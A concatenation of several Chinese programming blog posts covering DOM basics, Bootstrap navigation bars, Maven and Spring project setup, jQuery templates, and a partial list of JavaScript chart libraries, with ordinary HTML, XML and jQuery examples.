             当然，该代码本身没什么用，但它演示了每个 Web 浏览器使得 document 对象可用于 JavaScript 代码，并演示了对象表示标记的完整树（图 1）。每项都是一个节点显然，document 对象很重要，但这只是开始。在进一步深入之前，需要学习另一个术语：节点。您已经知道标记的每个部分都由一个对象表示，但它不只是一个任意的对象，它是特定类型的对象，一个 DOM 节点。更特定的类型，比如文本、元素和属性，都继承自这个基本的节点类型。所以可以有文本节点、元素节点和属性节点。如果已经有很多 JavaScript 编程经验，那您可能已经在使用 DOM 代码了。如果到目前为止您一直在跟踪本 Ajax 系列，那么现在您一定 使用 DOM 代码有一段时间了。例如，代码行 var number = document.getElementById("phone").value; 使用 DOM 查找特定元素，然后检索该元素的值（在本例中是一个表单字段）。所以即使您没有意识到这一点，但您每次将 document 键入 JavaScript 代码时都会使用 DOM。详细解释已经学过的术语，DOM 树是对象的树，但更具体地说，它是节点 对象的树。在 Ajax 应用程序中或任何其他 JavaScript 中，可以使用这些节点产生下列效果，比如移除元素及其内容，突出显示特定文本，或添加新图像元素。因为都发生在客户端（运行在 Web 浏览器中的代码），所以这些效果立即发生，而不与服务器通信。最终结果通常是应用程序感觉起来响应更快，因为当请求转向服务器时以及解释响应时，Web 页面上的内容更改不会出现长时间的停顿。在多数编程语言中，需要学习每种节点类型的实际对象名称，学习可用的属性，并弄清楚类型和强制转换；但在 JavaScript 中这都不是必需的。您可以只创建一个变量，并为它分配您希望的对象（正如您已经看到的）：var domTree = document;
            var phoneNumberElement = document.getElementById("phone");
            var phoneNumber = phoneNumberElement.value;
             没有类型，JavaScript 根据需要创建变量并为其分配正确的类型。这也是简单的JS获得DOM元素。

版权声明：感觉我写的还算不错的的话希望你能够动动你的鼠标和键盘为我点上一个赞或是为我奉献上一个评论，在下感激不尽!_______________________________________________________欢迎转载，希望在你转载的同时，添加原文地址，谢谢配合

玩转Bootstrap（基础） -- （6.导航条基础）
1.导航条例子
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>导航条</title>
<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
</head>

<body>
<!--基本导航条-->
<div class="navbar navbar-default" role="navigation">
     <ul class="nav navbar-nav">
        <li class="active"><a href="##">网站首页</a></li>
        <li><a href="##">系列教程</a></li>
        <li><a href="##">名师介绍</a></li>
        <li><a href="##">成功案例</a></li>
        <li><a href="##">关于我们</a></li>
     </ul>
</div>
<div class="navbar navbar-default" role="navigation">
  　<div class="navbar-header">
  　    <a href="##" class="navbar-brand">慕课网</a>
  　</div>
     <ul class="nav navbar-nav">
        <li class="active"><a href="##">网站首页</a></li>
      <li class="dropdown">
        <a href="##" data-toggle="dropdown" class="dropdown-toggle">系列教程<span class="caret"></span></a>
        <ul class="dropdown-menu">
            <li><a href="##">CSS3</a></li>
            <li><a href="##">JavaScript</a></li>
            <li class="disabled"><a href="##">PHP</a></li>
        </ul>
     </li>
      <li><a href="##">名师介绍</a></li>
      <li><a href="##">成功案例</a></li>
      <li><a href="##">关于我们</a></li>
     </ul>
  <form action="##" class="navbar-form navbar-left" rol="search">
    <div class="form-group">
        <input type="text" class="form-control" placeholder="请输入关键词" />
    </div>
     <button type="submit" class="btn btn-default">搜索</button>
   </form>
</div>
<!--代码-->
<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script> 

</body>
</html>

2.基础导航条 
在制作一个基础导航条时，主要分以下几步： 
第一步：首先在制作导航的列表()基础上添加类名“navbar-nav” 
第二步：在列表外部添加一个容器（div），并且使用类名“navbar”和“navbar-default” 
示例查看右侧代码编辑（10-19行）。 
“.navbar”样式的主要功能就是设置左右padding和圆角等效果，但他和颜色相关的样式没有进行任何的设置。 
而导航条的颜色都是通过“.navbar-default”来进行控制。 
navbar-nav样式是在导航.nav的基础上重新调整了菜单项的浮动与内外边距。同时也不包括颜色等样式设置
<!--代码-->
<div class="navbar navbar-default" role="navigation"><!--navbar-default就是给指定的区域标成灰色-->
     <ul class="nav navbar-nav"> 
        <li class="active"><a href="##">网站首页</a></li>
        <li><a href="##">系列教程</a></li>
        <li><a href="##">名师介绍</a></li>
        <li><a href="##">成功案例</a></li>
        <li><a href="##">关于我们</a></li>
     </ul>
</div>

3.在导航栏里面加上表单 
说明：在Bootstrap框架中提供了一个“navbar-form”，使用方法很简单，在navbar容器中放置一个带有navbar-form类名的表单。 
大家看到了“navbar-left”让表单左浮动，更好实现对齐。在Bootstrap框架中，还提供了“navbar-right”样式，让元素在导航条靠右对齐。 
navbar-left或者right要和navbar-form一起使用。如果是right的话，就那个表单自动向右对其。
<div class="navbar navbar-default" role="navigation">
  　<div class="navbar-header">
  　    <a href="##" class="navbar-brand">慕课网</a>
  　</div>
    <ul class="nav navbar-nav">
       <li class="active"><a href="##">网站首页</a></li>
       <li class="dropdown">
          <a href="##" data-toggle="dropdown" class="dropdown-toggle">系列教程<span class="caret"></span></a>
          <ul class="dropdown-menu">
            <li><a href="##">CSS3</a></li>
            <li><a href="##">JavaScript</a></li>
            <li class="disabled"><a href="##">PHP</a></li>
          </ul>
      </li>
      <li><a href="##">名师介绍</a></li>
      <li><a href="##">成功案例</a></li>
      <li><a href="##">关于我们</a></li>
     </ul>
     <form action="##" class="navbar-form navbar-left" rol="search">
        <div class="form-group">
           <input type="text" class="form-control" placeholder="请输入关键词" />
        </div>
        <button type="submit" class="btn btn-default">搜索</button>
     </form>
</div>

4.导航条中的按钮、文本和链接 
Bootstrap框架的导航条中除了使用navbar-brand中的a元素和navbar-nav的ul和navbar-form之外，还可以使用其他元素。框架提供了三种其他样式： 
1、导航条中的按钮navbar-btn 
2、导航条中的文本navbar-text 
3、导航条中的普通链接navbar-link 
但这三种样式在框架中使用时受到一定的限制，需要和navbar-brand、navbar-nav配合起来使用。而且对数量也有一定的限制，一般情况在使用一到两个不会有问题，超过两个就会有问题。
<div class="navbar navbar-default" role="navigation">
  　<div class="navbar-header">
  　    <a href="##" class="navbar-brand">慕课网</a>
  　</div>
     <div class="nav navbar-nav">
        <a href="##" class="navbar-text">Navbar Text</a>
        <a href="##" class="navbar-text">Navbar Text</a>
        <a href="##" class="navbar-btn">Navbar Text</a>
     </div>
</div>

5.固定导航条 
很多情况之一，设计师希望导航条固定在浏览器顶部或底部，这种固定式导航条的应用在移动端开发中更为常见。Bootstrap框架提供了两种固定导航条的方式： 
   ☑  .navbar-fixed-top：导航条固定在浏览器窗口顶部 
   ☑  .navbar-fixed-bottom：导航条固定在浏览器窗口底部
<div class="navbar navbar-default navbar-fixed-top" role="navigation">
  　<div class="navbar-header">
  　    <a href="##" class="navbar-brand">慕课网</a>
  　</div>
     <ul class="nav navbar-nav">
        <li class="active"><a href="##">网站首页</a></li>
        <li><a href="##">系列教程</a></li>
        <li><a href="##">名师介绍</a></li>
        <li><a href="##">成功案例</a></li>
        <li><a href="##">关于我们</a></li>
     </ul>
</div>
<div class="content">我是内容</div>
<div class="navbar navbar-default navbar-fixed-bottom" role="navigation">
  　<div class="navbar-header">
  　 <a href="##" class="navbar-brand">慕课网</a>
  　</div>
     <ul class="nav navbar-nav">
        <li class="active"><a href="##">网站首页</a></li>
        <li><a href="##">系列教程</a></li>
        <li><a href="##">名师介绍</a></li>
        <li><a href="##">成功案例</a></li>
        <li><a href="##">关于我们</a></li>
     </ul>
</div> 

6.响应式导航条 
如今浏览Web页面的终端不在是一尘不变了，前面示例实现的导航条仅能适配于大屏幕的浏览器，但当浏览器屏幕变小的时候，就不适合了。因此响应式设计也就随之而来。那么在一个响应式的Web页面中，对于响应式的导航条也就非常的重要。例如Bootstrap框架官网的导航条： 
 
1、保证在窄屏时需要折叠的内容必须包裹在带一个div内，并且为这个div加入collapse、navbar-collapse两个类名。最后为这个div添加一个class类名或者id名。 
2、保证在窄屏时要显示的图标样式（固定写法）：
<button class="navbar-toggle" type="button" data-toggle="collapse">
  <span class="sr-only">Toggle Navigation</span>
  <span class="icon-bar"></span>
  <span class="icon-bar"></span>
  <span class="icon-bar"></span>
</button>
3、并为button添加data-target=”.类名/#id名”，究竞是类名还是id名呢？由需要折叠的div来决定。如： 
需要折叠的div代码段：
<div class="collapse navbar-collapse" id="example">
      <ul class="nav navbar-nav">
      …
      </ul>
</div>
窄屏时显示的图标代码段：
<button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#example">
  ...
</button>
也可以这么写，需要折叠的div代码段：
<div class="collapse navbar-collapse example" >
      <ul class="nav navbar-nav">
      …
      </ul>
</div>
窄屏时要显示的图标：
<button class="navbar-toggle" type="button" data-toggle="collapse" data-target=".example">
  ...
</button>
7.反色导航条 
反色导航条其实是Bootstrap框架为大家提供的第二种风格的导航条，与默认的导航条相比，使用方法并无区别，只是将navbar-deafult类名换成navbar-inverse。其变化只是导航条的背景色和文本做了修改。其实就只是将导航栏的颜色变成黑色而已。 
如下：
<div class="navbar  navbar-inverse" role="navigation">
<div class="nav bar-header">
      <a href="##" class="navbar-brand">慕课网</a>
</div>
<ul class="nav navbar-nav">
      <li class="active"><a href="">首页</a></li>
      <li><a href="">教程</a></li>
      <li><a href="">关于我们</a></li>
</ul>
</div>

8.分页导航（带页码的分页导航） 
平时很多同学喜欢用div>a和div>span结构来制作带页码的分页导航。不过，在Bootstrap框架中使用的是ul>li>a这样的结构，在ul标签上加入pagination方法：
<ul class="pagination">
   <li><a href="#">&laquo;</a></li>
   <li><a href="#">1</a></li>
   <li><a href="#">2</a></li>
   <li><a href="#">3</a></li>
   <li><a href="#">4</a></li>
   <li><a href="#">5</a></li>
   <li><a href="#">&raquo;</a></li>
</ul>
 
在Bootstrap框架中，也可以通过几个不同的情况来设置其大小。类似于按钮一样： 
1、通过“pagination-lg”让分页导航变大； 
2、通过“pagination-sm”让分页导航变小： 
大小设置实现原理： 
其实就是通增加相应的padding大小、font-size大小和圆角大小
9.分页导航（翻页分页导航） 
这种分页导航是看不到具体的页码，只会提供一个“上一页”和“下一页”的按钮。 
使用方法： 
在实际使用中，翻页分页导航和带页码的分页导航类似，为ul标签加入pager类：
<ul class="pager">
   <li><a href="#">&laquo;上一页</a></li>
   <li><a href="#">下一页&raquo;</a></li>
</ul>
默认情况之下，翻页分页导航是居中显示，但有的时候我们需要一个居左，一个居右。Bootstrap框架提供了两个样式： 
   ☑   previous：让“上一步”按钮居左 
   ☑   next：让“下一步”按钮居右 
具体使用的时候，只需要在li标签上添加对应类名即可：
<ul class="pager">
   <li class="previous"><a href="#">&laquo;上一页</a></li>
   <li class="next"><a href="#">下一页&raquo;</a></li>
</ul>
状态样式设置： 
和带页码分页导航一样，如果在li标签上添加了disabled类名的时候，分页按钮处于禁用状态，但同样不能禁止其点击功能。你可以通过js来处理，或将a标签换成span标签。
10.标签 
使用方法很简单，你可以在使用span这样的行内标签：
<h3>Example heading <span class="label label-default">New</span></h3>
主要是通过这几个类名来修改背景颜色和文本颜色：
默认标签 label-default 
 
主要标签 label-primary 
成功标签 label-success 
信息标签 label-info 
警告标签 label-warning 
错误标签 label-danger
11.徽章 
在Bootstrap框架中，把这种效果称作为徽章效果，使用“badge”样式来实现。 
使用方法： 
使用方法，其实也没什么太多可说的，你可以像标签一样，使用span标签来制作，然后为他加入badge类：
<a href="#">Inbox <span class="badge">42</span></a>
Inbox 42 
实现原理： 
主要将其设置为椭圆形，并且加了一个背景色：
<div class="navbar navbar-default" role="navigation">
　<div class="navbar-header">
　       <a href="##" class="navbar-brand">慕课网</a>
　</div>
  <ul class="nav navbar-nav">
         <li class="active"><a href="##">网站首页</a></li>

         <li><a href="##">成功案例<span class="badge">23</span></a></li>
         <li><a href="##">关于我们</a></li>
  </ul>
</div>
<a href="#">Inbox <span class="badge">42</span></a> 
<!--navbar-default导航条勋章-->
<div class="navbar navbar-default" role="navigation">
  　<div class="navbar-header">
  　    <a href="##" class="navbar-brand">慕课网</a>
  　</div>
    <ul class="nav navbar-nav">
        <li class="active"><a href="##">网站首页</a></li>
        <li><a href="##">系列教程</a></li>
        <li><a href="##">名师介绍</a></li>
        <li><a href="##">成功案例<span class="badge">23</span></a></li>
        <li><a href="##">关于我们</a></li>
    </ul>
</div>
<!--nav-pills导航条勋章-->
<ul class="nav nav-pills">
  <li class="active"><a href="#">Home <span class="badge">42</span></a></li>
  <li><a href="#">Profile</a></li>
  <li><a href="#">Messages <span class="badge">3</span></a></li>
</ul>
<br /> 
<ul class="nav nav-pills nav-stacked" style="max-width: 260px;">
      <li class="active">
        <a href="#">
          <span class="badge pull-right">42</span>
          Home
        </a>
      </li>
      <li><a href="#">Profile</a></li>
      <li>
        <a href="#">
          <span class="badge pull-right">3</span>
          Messages
        </a>
      </li>
</ul>
<br />
<!--按钮勋章-->
<button class="btn btn-primary" type="button">
      Messages <span class="badge">4</span>
</button> 


            $(function () {
                $('pre.prettyprint code').each(function () {
                    var lines = $(this).text().split('\n').length;
                    var $numbering = $('<ul/>').addClass('pre-numbering').hide();
                    $(this).addClass('has-numbering').parent().append($numbering);
                    for (i = 1; i <= lines; i++) {
                        $numbering.append($('<li/>').text(i));
                    };
                    $numbering.fadeIn(1700);
                });
            });
        

版权声明：本文为博主原创文章，未经博主允许不得转载。

Maven项目初开发（一）Maven项目开发的初配置（2）
上一章讲了Maven的基本概念，下面讲操作Maven实现第一个Hello world。
Maven的设置
首先在window--preference--maven-user setttings中配置maven的settings.xml位置和本地仓库地址。




新建Maven项目
配置完成之后，new maven project。
不要选中Create a simple project复选框。




由于是基于maven的web项目，所以选择group id为org.apache.cocoon，artifact id为cocoon-22-archetype-webapp的选项。


弹出该窗口，



finish,项目中需要手动添加src/main/java文件夹。
配置web.xml文件
项目生成之后，会添加一个ApplicationContext.xml文件。是Spring的配置文件，这里留着，也可以删除，因为HelloWorld用不到Spring，但是留着会出问题，需要多配置一些东西，这里决定留着。
web.xml:
<?xml version="1.0" encoding="UTF-8"?>
<web-app version="2.4"
         xmlns="http://java.sun.com/xml/ns/j2ee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd">

  <!-- Servlet Filters ================================================ -->

  <!--
    - Declare a filter for multipart MIME handling
    -->
   <context-param>
		<param-name>contextConfigLocation</param-name>
		<param-value>classpath:/applicationContext.xml</param-value>
	</context-param>
  <listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
  </listener>

  <listener>
    <listener-class>org.springframework.web.context.request.RequestContextListener</listener-class>
  </listener>
    
 <filter>
		<filter-name>encodingFilter</filter-name>
		<filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
		<init-param>
			<param-name>encoding</param-name>
			<param-value>UTF-8</param-value>
		</init-param>
	</filter>
	<filter-mapping>
		<filter-name>encodingFilter</filter-name>
		<url-pattern>/*</url-pattern>
	</filter-mapping>
  
  <welcome-file-list>index.jsp</welcome-file-list>
</web-app>
        在这里，我把ApplicationContext.xml移到了src/main/resources中，所以配置了contextconfiglocation。然后配置了两个Spring的监听器和一个编码过滤器。最后加上一个hellwo world的显示页面。
之后，在webapp下新建一个叫index的jsp文件。写上hello world。
这样启动是会报错的，需要配置pom.xml。支持Spring。如果不加spring就没那么麻烦。
POM.XML配置
这是我的Hello world项目的pom.xml文件的配置。
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">

  <modelVersion>4.0.0</modelVersion>
  <packaging>war</packaging>

  <name>TimerTask</name>
  <groupId>WorkStudy</groupId>
  <artifactId>TimerTask</artifactId>
  <version>0.0.1-SNAPSHOT</version>
  <properties>
		<project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
		<spring.version>3.0.5.RELEASE</spring.version>
	</properties>
  <build>
    <plugins>
      <plugin>
        <groupId>org.mortbay.jetty</groupId>
        <artifactId>maven-jetty-plugin</artifactId>
        <version>6.1.7</version>
        <configuration>
          <connectors>
            <connector implementation="org.mortbay.jetty.nio.SelectChannelConnector">
              <port>8888</port>
              <maxIdleTime>30000</maxIdleTime>
            </connector>
          </connectors>
          <webAppSourceDirectory>${project.build.directory}/${pom.artifactId}-${pom.version}</webAppSourceDirectory>
          <contextPath>/</contextPath>
        </configuration>
      </plugin>
    </plugins>
  </build>

  <dependencies>
    <!--dependency>
      <groupId>WorkStudy</groupId>
      <artifactId>[the artifact id of the block to be mounted]</artifactId>
      <version>0.0.1-SNAPSHOT</version>
    </dependency-->
    <dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-web</artifactId>
		<version>3.0.5.RELEASE</version>
	</dependency>
    <dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-core</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-aop</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-asm</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-aspects</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-context</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-beans</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-context-support</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-expression</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-instrument</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-jdbc</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-orm</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-oxm</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>org.springframework</groupId>
		<artifactId>spring-tx</artifactId>
		<version>${spring.version}</version>
	</dependency>
	<dependency>
		<groupId>commons-logging</groupId>
		<artifactId>commons-logging</artifactId>
		<version>1.1.1</version>
	</dependency>
  </dependencies>

</project>
这两需要引入了很多Spring的包，但是最主要的还是Spring-web这个，没有它肯定会报这个错误：
Error configuring application listener of class org.springframework.web.context.ContextLoaderListener
这些包的依赖可以到这个网站上去搜索：
http://search.maven.org/

ApplicationContext.xml配置


pom.xml配置完成，可能ApplicationContext.xml也需要改一改，直接把里面的配置删了就行，当然要留下基本框架。
<?xml version="1.0" encoding="UTF-8"?>
<beans
	xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xmlns:p="http://www.springframework.org/schema/p"
	xmlns:jee="http://www.springframework.org/schema/jee" 
	xmlns:tx="http://www.springframework.org/schema/tx"
	xmlns:context="http://www.springframework.org/schema/context"
	xmlns:aop="http://www.springframework.org/schema/aop"
	xmlns:task="http://www.springframework.org/schema/task"
	xsi:schemaLocation="http://www.springframework.org/schema/beans 
		http://www.springframework.org/schema/beans/spring-beans-3.0.xsd 
		http://www.springframework.org/schema/tx 
		http://www.springframework.org/schema/tx/spring-tx-3.0.xsd 
		http://www.springframework.org/schema/jee 
		http://www.springframework.org/schema/jee/spring-jee-3.0.xsd 
		http://www.springframework.org/schema/context 
		http://www.springframework.org/schema/context/spring-context-3.0.xsd
		http://www.springframework.org/schema/aop 
		http://www.springframework.org/schema/aop/spring-aop-3.0.xsd
		http://www.springframework.org/schema/task
		http://www.springframework.org/schema/task/spring-task-3.0.xsd">
		
	<description>Spring公共配置 </description>
	
	<task:annotation-driven />


	
	 
</beans>配置完成，新建server，把项目加入server中，启动，然后从浏览器输入localhost:8080/TimerTask就OK了










版权声明：本文为博主原创文章，未经博主允许不得转载。

atitit.jquery tmpl模板总结 .doc
atitit.jquery tmpl模板总结 .doc
 
1. atitit.动态模版解析
1
1.1. Jquery.tmpl.js
1
1.2. 比起anrular js方便啊。
1
2. 动态模板引擎解析原理
1
3. Table方式
1
4. Ul li方式
2
5. 参考
3
 
 
1. atitit.动态模版解析
1.1. Jquery.tmpl.js
1.2. 比起anrular js方便啊。
2. 动态模板引擎解析原理
就是把<%%>标签外面的为字符串解析。里面的作为语句解析。。。雷施于jsp编译java的原理
 

作者:: 老哇的爪子 Attilax 艾龙，  EMAIL:1466519819@qq.com

转载请注明来源： http://blog.csdn.net/attilax
 
3. Table方式
localhost/lime/act/actlog_list.html?activityId=8
 
<table width="90%" border="1"  height="" align="center" cellpadding="1" cellspacing="3" id="table1" style=" margin-left:7px; margin-top:10px;"  class="table  table-striped">
 <thead>
      <tr class="success">
        <th valign="top"> </th>
  
    <th valign="top">openid</th>
    <th valign="top"> 活动金额</th>
    <th valign="top">  活动码</th>
    <th> 时间</th>
    <th> </th>
    </tr>
  </thead>
  <tbody id="table1_tmpl">
   <tr  >
     <td valign="top">${id}</td>
    <td valign="top">${openId}</td>
    <td valign="top"> ${bingo_money}</td>
    <td valign="top">  ${ bingo_code} </td>
    <td> ${awardTime}</td>
    <td><input name="button3" type="submit" class="btn btn-warning " id="button3" value="删除此记录" onclick="clickx(${id})"/></td>
   </tr>
 </tbody>
</table>
 
 
arr=
 jo.rows;
 
 

$("#table1_tmpl tr").eq(0).nextAll().remove();

 
 
　$("#table1_tmpl").tmpl(arr).appendTo('#table1');
 $("#table1 tr").eq(1).hide();
 
 
4. Ul li方式
<div id="table1_tmpl">
  <li class="text-left">
     <img src="img/temp/2352201.jpg">
     <div class="time"><u class="iconfont"></u>${ formatDate_4java(create_time) }</div>
      <h1><a href="detail.html?news_id=${news_id}">${news_title}</a></h1>
      <p class="desc">{{html news_content}}</p>
      <div class="more"><a href="detail.html?news_id=${news_id}" class="btn-red-border">查看更多</a></div>
     </li>
 </div>    
     
  <div class="right-content">
    <ul class="list" id="table1">
   
</ul>
 
 
5. 参考
 
 
(原理)最简单的JavaScript模板引擎 - Javascript教程_JS教程_技术文章 - 红黑联盟.htm
（简单） 基于HTML模板和JSON数据的JavaScript交互 « 张鑫旭-鑫空间-鑫生活.htm
 
 
Json2Template.js 基于jquery的插件 绑定JavaScript对象到Html...
JS使用模板快速填充HTML控件数据 - Freshflower - ITeye技术网站.htm
 
 
http://api.jquery.com/jquery.tmpl/
 
 
 
 
﻿﻿

版权声明：本文为博主原创文章，未经博主允许不得转载。

21 个最棒最有用的 JavaScript 图表库



每个企业在做重要决定时都倾向于做数据分析。实际上他们很多时候都是沉沦在数据里头，不知道如何跳出其中。随着大数据的到来，曾经好用的表格和图表只是不再削减它了。
企业一直寻求更好的方式来可视化数据，更好的互动和使图表多角度。毕竟，只有从数据中抽出的见解才是有用的。
JavaScript 图表库出现了，作为漂亮的，容易理解的，交互式的可视化图表最有力的工具。它能更容易提取和传达关键的模式和见解，而静态图表往往不明显。
为了使事情更加简单，我努力挖掘了很多选项，找到了你需要的最好的 JavaScript 图表库。所以，让我们开始吧。
1. Chartist.js

Chartist 的高效和人性化设计甚至吸引了离开 Excel 就会感觉不舒服的人。可响应（使用媒体查询）和独立 DPI 意味着这些图表可以为你提供一个良好的解决方案，如果你在考虑将你的图表应用于包括手机，平板和桌面电脑的多终端设备。基于 SVG 的设计让它在未来更具兼容性。
Chartist 的于从不同在于它是社区的成果，这使得它没有其他图表库的局限性。由于过于关注琐碎的变动和功能完整，导致你在使用其他类库时很焦心。
协议: 开源，所有用户皆可免费使用。
2. FusionCharts

FusionCharts 带来了一个最全面的库，超过 90 中图表和 900 种图——所有均就绪备用。它们自诩为行业内最好看图表，它提供了一个功能强大的体验仪表板，通过它可以鸟瞰其整个业务功能。
FusionCharts 兼容从 PC 和 Mac 电脑，iPhone 和 Android 平板电脑等多种设备；他们做了许多额外的努力来确保跨浏览器的兼容性，甚至包括 IE6！
他们还涵盖了所有基础格式 —— JSON 和 XML 数据格式都能够接受；绘制可以通过 HTML5、SVG 和 VML，图表可以导出为 PNG，JPG 或 PDF 格式。FusionCharts 的扩展可以很容易地与你所选择的任何技术集成，包括 jQuery，AngularJS，PHP 和 Rails。
总的来说，FusionCharts 拥有你创建漂亮图表和做严格业务分析所需的任何特征和格式。而且最好的部分是非商业用途时你可以免费下载并使用，没有任何限制。
源码许可证：非商业免费，商业用途收费。
3. Dygraphs

Dygraphs 是一个开源的 JavaScript 图表库，最适用于极端大数据集。它是开箱式互动，通过缩放甚至可以支持手机。
它既兼容主流浏览器，也向后兼容 IE8。选项和自定义回调功能使它具有极高的可配置性。
协议: 开源，面向所有用户免费。
4. Chart.js

Chart.js适用于小项目，如果你需要扁平化，干净，优雅，快速。它是一个微型的开源库，最小化压缩后只有11kb大小。包括六个核心图表类型（线图，柱图，雷达图，极地图，饼图和环形图）每个都是独立的模块，所以你甚至可以只加载项目需要的模块以最大化缩小代码占用空间。
它使用HTML5 canvas元素渲染图表，并且使用polyfills方式兼容在IE7/8上运行。所有图表都是可响应的。
协议: 开源，面向所有用户免费。
5. Google Charts

Google Charts 提供大量不同种类的图表，它最大程度上满足了数据可视化的需要。图表基于 HTML5/SVG，为了兼容老版本的 IE 还支持 VML。所有的图表都是可交互，可缩放的。你可以去看看他们的图表库。并且最棒的部分是他们的图表绝对免费。
协议：免费，但是不开源，在你的服务器上使用他们的 JS 文件是 Google’s协议不允许 的。因此如果你是一家企业并且有很多敏感数据，Google Charts 可能不是一个最佳的选项。
6. Highcharts

Highcharts 是又一个流行的交互图表库，与其他库一样，它是基于 HTML5/SVG/VML，所以不需要扩展插件。提供的图表类型很广泛，像曲线图，柱状图，条形图，地图，仪表盘等。
它还提供个人用户免费，可在线生成交互式图表的接口 Highcharts cloud，商业使用需要购买授权。
协议: 非商业使用免费，商业使用付费。
7. Flot

Flot 是最古老的图表库之一，围绕着用法简单并聚焦交互特性。它是特定的 jQuery 库，这意味着你需要使用它需要熟悉基础的 jQuery。但是从另一方面来说，这意味着你可以全面控制呈现，动作和用户交互。
Flot 兼容大多数现代浏览器，向下兼容到 IE6。Flot 的插件库提供许多类型的图，所有贡献都是社区提供的。你可以看看这些由 Flot 制作的例子。
协议: 开源，面向所有用户免费。
8. D3.js

D3通常是提到数据可视化时出现的第一个名字。它是一个非常强大的开源项目，可以通过动态更新DOM创造出惊人的视觉效果和图形。另外，它使用HTML，CSS和SVG。
它符合W3C标准，并且是跨浏览器兼容的。开发者们往往喜欢它所带来的许多特征，比如“进入和退出”以及强大的过渡。你可以到这里找到一些 D3 的示例。
需要说明的是，它没有预建图表，即时学习基本的图表也有一条非常陡峭的学习曲线。但开发者们是极富创新性，开发出了不少基于D3的包装库。后面我们将涉及到其中的一些佼佼者。
源码许可证: 开源。免费使用。
9. n3-charts

如果你正在寻找一种在 AngularJS 应用下创建简单互动线图的方法，这将是你所需要的。N3 基于D3.js 针对小量受众–基于 AngularJS 绘制通用线图。如果你需要更多的图表类型，它可能不适合你。你可以在这里看到一些N3线图的实例。
源码许可证：开源。对所有人免费。
10. NVD3

NVD3是一个旨在建立可复用的图表和组件的 d3.js 项目——它提供了同样强大的功能，但更容易使用。它可以让你处理复杂的数据集来创建更高级的可视化。
源码许可证：开源。对所有人免费。
11. Ember Charts

Addepar 的开发者为提升 Ember 以及其附属库 Ember Charts、Ember Tables 和 Ember Widgets 的体验的工作稳步推进着。Ember Charts 基于 D3.js 和 Ember.js 框架提供了一个易于使用，可扩展的图表套件。
其强壮且优雅——针对坏数据的错误处理能确保有怪数据时应用程序不会崩溃。你甚至可以通过扩展它来创建自己的图表类型。
源码许可证：开源。对所有人免费。
12. jQuery Sparklines

我们一直在谈论那些能搞定一切的重量型的库。但有时，你需要的是针对简单的任务简单些的东西。jQuery Sparklines 插件提供了一个合适的解决方案。它能够被用来生成迷你型的小内嵌图表，刚好足够去表现趋势——只需要最小量的编码。适用于大多数现代浏览器包括更老的IE6。
源码许可证：开源。对所有人免费。
13. Sigma.js

当我们在特定的使用场景下时，我们必须谈谈 Sigma。Sigma 是一个强大的 JavaScript 库，其关注于呈现交互图形和 Web 网络。
Sigma 的库和插件包有大量的互动设置。一旦你使用了 Sigma，你将再也不会觉得线图无聊。看一下这个sigma.js侧翻演示你就会明白我的意思。
源码许可证：开源。对所有人免费。
14. Morris.js

是的，正如 Morris 所说，好看的图不应该制作困难。Morris 是一个基于 jQuery 和 Raphael 的轻量级库，它提供简单、干净的线条，面积图，条形及圆环图。如果你正在寻找一些快速简单且和优雅的库，它绝对值得一试。
源码许可证：开源。对所有人免费。
15. Cytoscape.js

Cytoscape.js 是一个开源的、功能齐全的图形库，它纯粹用 JavaScript 编写，基于 LGPL3+ 许可完全免费。它经过了高度优化没有外部依赖。Cytoscape.js 可以让你创建可复用的图形工具，并能够集成到你的 JavaScript 代码中。
它同样兼容所有现代浏览器，还兼容各种软件框架，比如CommonJS和Node.js，AMD/Require.js，jQuery 以及 Meteor/Atmosphere 等许多。注意，虽然它与Cyctoscape 桌面应用名字相同，但它们是完全不同的。
源码许可证：免费。对所有人免费。
16. C3.js

C3.js 是另一个基于 D3 可重用的图表库。大量的基于 D3 的图表工具表明了太多人喜欢 D3 的功能，但也反映了大家讨厌用 D3 直接编码。
